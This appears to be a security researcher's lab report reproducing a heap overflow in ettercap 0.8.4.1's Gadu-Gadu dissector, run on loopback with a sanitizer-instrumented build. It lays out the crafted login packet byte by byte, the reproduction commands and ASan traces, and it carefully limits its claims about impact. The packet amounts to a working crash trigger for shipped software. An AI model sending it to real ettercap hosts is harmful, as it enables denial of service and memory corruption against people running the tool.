# ettercap2shell — live dissector reproduction of CVE-2026-125401

Date: 2026-11-23 (wake starting 02:57Z). All work stayed on the host loopback
interface inside `lab/frontier/ettercap2shell/`; no external probe, no scan, no
second node. This is a continuation of `reports/frontier-ettercap.md`: that
report measured the helper in a direct-call harness; this one drives the **real
ettercap 0.8.4.1 dissector** with crafted Gadu-Gadu bytes, both as a pcap replay
and as a **live packet sent on `lo`**.

## Result in one paragraph

A single crafted TCP/8074 `GG_LOGIN50_CMD` packet with `version=0x44000042`
makes an ASan-instrumented, unmodified ettercap `v0.8.4.1` write past the end
of its 30-byte `tbuf3` allocation inside `gg_get_version()`, reached from
`dissector_gg()` **before** the per-message length guard. The same packet sent
as a live frame on loopback produces the same report. This upgrades the
frontier's rung-3 result from a harness slice to the real parse stack. Rung 4
stays scoped and partial: packet bits choose the extent and which fixed suffix
bytes cross the boundary; there is no arbitrary-byte write, no pointer control
and no command execution. Rung 5 is not claimed. AV:A is not promoted.

## Build provenance

| Item | Value |
|---|---|
| Vulnerable source | `git clone --depth 1 --branch v0.8.4.1`, HEAD `0dc8409779f3a09cbfff4434b9a4d7b33480d88d` |
| `ec_gg.c` SHA-256 | `a97a0984f9c9b62910f3259715287b42cff8dff87115913001f687f0a05189d8` |
| Fixed source | `git clone --depth 1 --branch v0.8.5.1`, HEAD `832524f3c4c215f1007fe9f190dbf052ee965b55` |
| Fixed `ec_gg.c` SHA-256 | `a516ce050828f2c2abec17be35b1b87cea4d2b5c60484c073161d6e8a1fcce8d` |
| libnet | bundled 1.3 tarball, built separately with clean `-O2 -fPIC` |
| Compiler | Ubuntu clang 18.1.3, `CMAKE_BUILD_TYPE=Debug`, `-fsanitize=address -g -O1 -fno-omit-frame-pointer`, `-DCMAKE_EXE_LINKER_FLAGS=-fsanitize=address` |
| CMake switches | `-DENABLE_GTK=OFF -DENABLE_CURSES=ON -DENABLE_PLUGINS=OFF -DENABLE_GEOIP=OFF -DENABLE_IPV6=OFF -DENABLE_TESTS=OFF -DSYSTEM_LIBNET=ON -DBUNDLED_LIBNET=OFF -DLIBNET_INCLUDE_DIR=<...>/inst/include -DLIBNET_LIBRARY=<...>/inst/lib/libnet.a` |
| ASan binary SHA-256 | `82bd9971fbf104928a56c2a418b5a75c4a066d15de593cb8d904cf6cfac60bb7` (vuln), `a6a85b52f7cc20e182cc2274a8c9566fc807e8532cda26d1df78fd5f9c1bbc67` (fixed) |

The bundled libnet build fails when the ettercap-wide ASan flags are exported
into its autotools/libtool configure; building it once with clean flags into a
local prefix and linking it statically avoids that. It is not part of the
vulnerable code path. The two `ec_gg.c` hashes are byte-identical to the
frontier pins (`src/ec_gg.c.v0.8.4.1` and `src/ec_gg.c.v0.8.5.1`), so the
harness slices and the live build are the same shipped source.

## Packet

`live-evidence/gg-vuln.pcap` holds one 78-byte Ethernet frame: IPv4
192.168.1.10:12345 -> 192.168.1.20:8074, TCP PSH+ACK, payload 24 bytes. The
payload is:

```
type   = 0x0000000c  (GG_LOGIN50_CMD, little endian)
len    = 0x00000010  (16 = payload_len - 8, passes ec_gg.c:349)
uin    = 0x00001000
hash   = 0x00002000
status = 0x00000030
version= 0x44000042  (bytes 42 00 00 44 at payload offset 20)
```

`struct gg_login50_hdr` puts `version` at payload offset 20, so a 24-byte
payload is exactly enough to read it. `gg->len - 22 = -6`, so the guard at
`ec_gg.c:361` would reject the message — **but it runs after** the
`gg_get_version()` call at `ec_gg.c:360`. No guard fires first.

## Experiment A — pcap replay through the real dissector

From `build-asan/` (so `./share/etter.conf` resolves):

```
ASAN_OPTIONS=detect_leaks=0:abort_on_error=0 \
  ./src/ettercap -T -q -r <pcap> -i lo
```

`live-evidence/replay-vuln.out` reports:

```
ERROR: AddressSanitizer: heap-buffer-overflow
WRITE of size 13 ... thread T2
  #0 strcat
  #1 gg_get_version       src/dissectors/ec_gg.c:673:4
  #2 dissector_gg         src/dissectors/ec_gg.c:360:4
  #3 decode_data          src/ec_decode.c:305:10
  #4 decode_tcp           src/protocols/ec_tcp.c:295:4
  #5 decode_ip            src/protocols/ec_ip.c:232:4
  #6 decode_eth           src/protocols/ec_eth.c:81:4
  #8 pcap_loop ...        #10 capture src/ec_capture.c:90:10
0 bytes after 30-byte region ... allocated by thread T2:
  #1 dissector_gg         src/dissectors/ec_gg.c:356:4   (SAFE_CALLOC(tbuf3,30,1))
```

## Experiment B — live packet on loopback

`liveinject.py` starts the same binary with `-T -q -z -p -i lo -f 'tcp port
8074'` as root via `sudo -n env EC_UID=1000 EC_GID=1000 ...` (ettercap opens
the capture socket, then drops to the lab owner so it can read its `share/`
files), waits for "Starting Unified sniffing...", then `sendframe.py` sends the
frame from the pcap verbatim with `AF_PACKET`/`SOCK_RAW` bound to `lo`, and the
process is terminated. No interface other than `lo` is touched; the sender is
terminated in the same script.

`live-evidence/live-vuln.out`:

```
Listening on: lo -> 00:00:00:00:00:00, 127.0.0.1/255.0.0.0
Starting Unified sniffing...
ERROR: AddressSanitizer: heap-buffer-overflow
WRITE of size 13 ... thread T3
  #0 strcat
  #1 gg_get_version       src/dissectors/ec_gg.c:673:4
  #2 dissector_gg         src/dissectors/ec_gg.c:360:4
  #3 decode_data          src/ec_decode.c:305:10
  #4 decode_tcp           src/protocols/ec_tcp.c:295:4
  #5 decode_ip            src/protocols/ec_ip.c:232:4
  #6 decode_eth           src/protocols/ec_eth.c:81:4
  #10 pcap_loop           #11 capture src/ec_capture.c:90:10
0 bytes after 30-byte region ... allocated by thread T3 at ec_gg.c:356
```

The live stack reaches the write through `pcap_loop` on a live capture, not
through `-r`; the bytes on the wire are the crafted ones, not a synthetic
in-process call.

## Controls (same binary, same injection path)

| Packet | version / change | Live result | Replay result |
|---|---|---|---|
| `gg-vuln` | `0x44000042`, both suffix flags | ASan `WRITE of size 13` at `ec_gg.c:673` | same |
| `gg-extent18` | `0x44000018`, low byte maps to `"5.0/4.9"`; both suffix flags | ASan `WRITE of size 12` at `ec_gg.c:676` | same |
| `gg-extent40` | `0x04000042`, only the `eraomnix` flag | ASan `WRITE of size 12` at `ec_gg.c:676` | same |
| `gg-safe` | `0x0000002a` -> `"7.7"`, no flags | no heap overflow | no heap overflow |
| `gg-wrongtype` | type `0x01` (WELCOME) | no heap overflow | no heap overflow |
| `gg-serverdir` | same login from :8074 toward :12345 (server -> client), 60-byte payload | no heap overflow (direction check) | no heap overflow |
| `gg-long` | full 60-byte login payload, `0x44000042` | not run live | ASan `WRITE of size 13` |
| fixed `v0.8.5.1` build | same `gg-vuln` frame | no heap overflow | no heap overflow |

The source explains the two write sizes: `sprintf(str,"unknown (0x%X)",version)`
is 20 bytes for `0x44000042`, then `strcat(" + has audio")` (12 chars + NUL =
13) crosses first at line 673; for `0x44000018` the low byte selects
`"5.0/4.9"`, so only the second `strcat(" + eraomnix")` (11 chars + NUL = 12)
crosses at line 676. For `0x04000042` the same second `strcat` crosses only
with its NUL. The overflow bytes are fixed literal suffixes, not
attacker-chosen arbitrary bytes.

Unrelated harness noise, preserved: on SIGTERM several control runs report
`AddressSanitizer: attempting double-free` in `capture_getifs`/`pcap_freealldevs`
during shutdown, and offline runs report `Joining already joined thread`.
Neither is in the GG path and neither is a finding about this CVE; the control
criterion used here is specifically `heap-buffer-overflow` in `gg_get_version`.

## Rung assessment

- **Rung 1 (suspected):** yes, source and advisory agree.
- **Rung 2 (reproducible crash):** yes, deterministic single packet, both
  replay and live.
- **Rung 3 (confirmed memory corruption):** yes — ASan `WRITE of size 13`,
  `0 bytes after 30-byte region`, allocation at `dissector_gg:356`, write in
  `gg_get_version`, on the shipped vulnerable source.
- **Rung 4 (demonstrated impact):** scoped and partial. Input bits select
  whether and how far the write crosses, and which fixed suffix byte lands at
  the boundary (WRITE 13 vs WRITE 12 at two source lines). The overwritten
  bytes are constants from the helper; there is no arbitrary-byte write, no
  pointer control, no benign marker execution. The natural consumer of
  `tbuf3` is the `DISSECT_MSG` format call after the guard, which is not reached
  in the short-packet case; no corruption-to-control path was measured.
- **Rung 5 (remote command execution):** no. No attacker-controlled command,
  no side effect beyond the ASan detection, and the injection was from the
  same host on `lo`, not from an adjacent network peer.

The advisory's AV:A remains a constraint. Reaching the dissector from a real
adjacent-network sender was not attempted; ettercap's normal deployment sees
traffic it is positioned to observe, which is exactly why the AV:A scope is
kept.

## Reproduction

Scripts and small artifacts are under `lab/frontier/ettercap2shell/live/`; the
durable copies are `lab/frontier/ettercap2shell/live-evidence/`:

```
cd lab/frontier/ettercap2shell/live
python3 mkggpcap.py gg-vuln.pcap          # or mkcontrols.py
cd ettercap-0.8.4.1/build-asan
ASAN_OPTIONS=detect_leaks=0:abort_on_error=0 \
  ./src/ettercap -T -q -r ../../gg-vuln.pcap -i lo
cd ../..
python3 liveinject.py gg-vuln.pcap        # sends one frame on lo, then stops ettercap
```

Full cmake invocations are recorded in `live-evidence/README.md`.

## Evidence index

- `live-evidence/gg-*.pcap` — seven crafted captures (78/154 bytes each).
- `live-evidence/live-*.out` — six live-loopback runs.
- `live-evidence/replay-*.out` — vulnerable and fixed offline replay.
- `lab/frontier/ettercap2shell/PROVENANCE.md` — earlier pin/harness provenance.

## What would change the mind

A live capture that reaches `gg_get_version()` only after a rejecting guard;
the fixed tag not matching the shipped 0.8.5.1 bytes; a natural consumer of the
overwritten heap bytes exercising chosen control data; or an adjacent-network
sender reproducing the write. None was observed.
